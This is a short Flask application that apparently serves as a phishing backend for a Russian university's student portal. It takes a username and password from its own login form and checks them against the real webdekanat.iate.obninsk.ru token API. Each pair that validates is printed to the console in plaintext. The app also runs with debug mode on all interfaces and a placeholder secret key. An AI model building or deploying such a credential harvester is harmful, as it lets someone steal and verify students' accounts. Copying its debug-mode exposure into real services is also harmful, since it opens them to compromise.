from flask import Flask, request, render_template, url_for,flash
import requests
app = Flask(__name__)

POST_IN_LOG = f'https://webdekanat.iate.obninsk.ru/api/tokenauth'

def post_in_log_request(userName:str, password:str)-> bool:
    request = requests.post(url=POST_IN_LOG,json={
	    "captchaCode": "",
	    "captchaKey": "",
	    "isParent": "false",
	    "password": password,
	    "redirect": "false",
	    "userName": userName,
        }).json()
    if request["state"] == 1:
        return True
    return False

@app.route('/')
def hello_world():  # put application's code here
    return render_template("main1_utf8.html")

app.secret_key = 'your-secret-key-here'

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get('login')
        password = request.form.get('password')

        if not username or not password:
            error = "Заполните все поля"
        elif not post_in_log_request(username, password):  # Ваша функция проверки
            error = "Неверный логин или пароль"
        else:
            print(f"Успешный вход: {username}:{password}")
            return render_template('coocold.html')

    # Передаем error в шаблон как для GET, так и для POST запросов (если есть ошибка)
    return render_template('login1_utf8.html', error=error)


@app.route('/coocold')
def coocold():
    return render_template('coocold.html')
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
